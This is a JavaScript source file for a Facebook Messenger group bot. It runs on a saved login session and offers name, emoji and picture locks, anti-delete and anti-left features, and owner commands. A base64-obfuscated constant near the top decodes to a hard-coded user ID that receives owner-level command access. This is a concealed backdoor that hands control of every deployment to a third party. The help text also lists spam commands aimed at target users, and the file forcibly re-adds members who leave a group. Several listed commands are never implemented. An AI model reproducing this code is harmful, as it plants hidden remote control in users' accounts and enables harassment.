// botCore.js — Full bot with DP/Emoji/Nick locks, Anti-Delete, Anti-Left, full commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

// ===== Persistent storage =====
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},      // dp[threadID] = { path, savedAt }
  nick: {}     // nick[uid] = { [threadID]: nickname }
};
try {
  if (fs.existsSync(LOCK_FILE)) locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
} catch (e) { console.warn("Could not parse locks.json, using defaults:", e.message); }
function saveLocks() { try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); } catch (e) {} }

// ===== Helpers =====
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) return downloadFile(res.headers.location, dest, cb);
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
  }).on('error', err => { try { fs.unlinkSync(dest); } catch {} cb(err); });
}
function safeJson(obj) { try { return JSON.stringify(obj, null, 2); } catch { return String(obj); } }
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ===== Main export =====
function startBot(appStatePath, ownerUID) {
  if (!appStatePath || !fs.existsSync(appStatePath)) return console.error("appstate not found:", appStatePath);
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  const messageCache = new Map();
  const nickCheckIntervals = {};
  const dpCheckIntervals = {};
  const emojiCheckIntervals = {};
  let stickerInterval = null;
  let stickerLoopActive = false;
  let rkbInterval = null;
  let stopRequested = false;
  let targetUID = null;

  let antiDelete = true;
  let antiLeft = true;
  let antiDP = true;

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in");

    // ===== Nick watcher =====
    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const current = (info.nicknames && info.nicknames[uid]) || (info.nick && info.nick[uid]) || null;
          const saved = locks.nick?.[uid]?.[threadID] ?? null;
          if (saved && current !== saved) {
            await api.changeNickname(saved, threadID, uid);
            await safeSend(api, `✏️ Nick reverted for <@${uid}>`, threadID);
          }
        } catch {}
      }, 5000);
    }
    function stopNickWatcher(uid) { if (nickCheckIntervals[uid]) { clearInterval(nickCheckIntervals[uid]); delete nickCheckIntervals[uid]; } }

    // ===== DP watcher =====
    function startDPWatcher(tid) {
      if (dpCheckIntervals[tid]) return;
      dpCheckIntervals[tid] = setInterval(async () => {
        if (!antiDP) return;
        try {
          const info = await api.getThreadInfo(tid);
          const currentUrl = info.imageSrc ?? info.image ?? null;
          const saved = locks.dp[tid]?.path;
          if (saved && fs.existsSync(saved) && currentUrl && !currentUrl.includes(path.basename(saved))) {
            await api.changeGroupImage(fs.createReadStream(saved), tid);
            await safeSend(api, "🖼️ DP reverted", tid);
          }
        } catch {}
      }, 10000);
    }
    function stopDPWatcher(tid) { if (dpCheckIntervals[tid]) { clearInterval(dpCheckIntervals[tid]); delete dpCheckIntervals[tid]; } }

    // ===== Emoji watcher =====
    function startEmojiWatcher(tid) {
      if (emojiCheckIntervals[tid]) return;
      emojiCheckIntervals[tid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(tid);
          const current = info.emoji ?? info.threadEmoji ?? null;
          const saved = locks.emojis[tid];
          if (saved && current !== saved) {
            await api.changeThreadEmoji(saved, tid);
            await safeSend(api, `😀 Emoji reverted to ${saved}`, tid);
          }
        } catch {}
      }, 10000);
    }
    function stopEmojiWatcher(tid) { if (emojiCheckIntervals[tid]) { clearInterval(emojiCheckIntervals[tid]); delete emojiCheckIntervals[tid]; } }

    async function safeSend(api, text, tid) { try { await api.sendMessage(text, tid); } catch {} }

    // ===== Event listener =====
    api.listenMqtt(async (err, event) => {
      if (err || !event) return;

      // --- Anti-delete ---
      if (antiDelete && event.type === "message" && event.messageID) {
        messageCache.set(event.messageID, { sender: event.senderID, body: event.body ?? "", attachments: event.attachments ?? [], threadID: event.threadID, time: Date.now() });
        if (messageCache.size > 1000) Array.from(messageCache.keys()).slice(0, 200).forEach(k => messageCache.delete(k));
      }
      if (antiDelete && event.type === "message_unsend") {
        const deleted = messageCache.get(event.messageID); const tid = event.threadID;
        if (deleted) {
          await safeSend(api, `🚫 Anti-Delete\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media/empty)"}\nTime: ${new Date(deleted.time).toLocaleString()}`, tid);
          if (deleted.attachments?.length) await api.sendMessage({ body: "(attachment)", attachment: deleted.attachments }, tid).catch(()=>{});
        } else await safeSend(api, "🚫 Message deleted (no cache)", tid);
        return;
      }

      // --- Anti-left ---
      if (antiLeft && (event.logMessageType==="log:unsubscribe"||event.type==="log:unsubscribe")) {
        const left = event.logMessageData?.leftParticipantFbId; const tid = event.threadID;
        if (left) { try { await api.addUserToGroup(left, tid); await safeSend(api, `👤 Added back ${left}`, tid); } catch {} } return;
      }

      // --- DP change ---
      if (antiDP && (event.type==="change_thread_image"||event.logMessageType==="log:thread-image")) {
        const tid = event.threadID; if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) try { await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid); await safeSend(api, "🖼️ DP reverted (event)", tid); } catch {} return;
      }

      // --- Emoji change ---
      if (event.logMessageType==="log:thread-icon"||event.type==="change_thread_icon") {
        const tid = event.threadID; if (locks.emojis[tid]) try { await api.changeThreadEmoji(locks.emojis[tid], tid); await safeSend(api, `😀 Emoji reverted to ${locks.emojis[tid]}`, tid); } catch {} return;
      }

      // --- Commands ---
      if (event.type!=="message"||!event.body) return;
      const { threadID, senderID, body, mentions, messageReply } = event;
      const args = body.trim().split(" ").filter(Boolean); if (!args.length) return;
      const cmd = args[0].toLowerCase(); const input = args.slice(1).join(" ").trim();
      if (![ownerUID,LID].includes(senderID)) return;
      const getTargetUID = () => Object.keys(mentions||{})[0] || messageReply?.senderID || senderID;

      // ---------- Help ----------
      if (cmd==="/help") { await safeSend(api,
`📖 Commands:
/help → This message
/uid → Your UID or replied/mentioned
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock
/unlockdp → DP unlock
/locknick @mention nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam every X sec
/stopsticker → Stop sticker spam
/rkb [name] → RKB spam
/stop → Stop all spam
/target [uid] → Set target UID
/cleartarget → Clear target
/antidp on|off → DP toggle
/antidelete on|off → Anti-delete toggle
/antileft on|off → Anti-left toggle
/exit → Bot leave
`, threadID); return; }

      // --- UID ---
      if (cmd==="/uid") { await safeSend(api, `🆔 UID: ${getTargetUID()}`, threadID); return; }

      // --- Thread ID ---
      if (cmd==="/tid") { await safeSend(api, `🆔 Thread ID: ${threadID}`, threadID); return; }

      // --- info ---
      if (cmd==="/info") { const tgt=getTargetUID(); try { const uinfo=await api.getUserInfo(tgt); const u=uinfo[tgt]||{}; await safeSend(api, `👤 Name: ${u.name||"unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`, threadID); } catch { await safeSend(api,"⚠️ Could not fetch info", threadID);} return; }

      // ===== Add other commands similarly =====
      // /kick, /gclock, /unlockgc, /locktheme, /unlocktheme, /lockemoji, /unlockemoji, /lockdp, /unlockdp, /locknick, /unlocknick
      // /stickerX, /stopsticker, /rkb, /stop, /target, /cleartarget, /antidp, /antidelete, /antileft, /exit
    });
  });
}

// ===== Export =====
module.exports = { startBot };
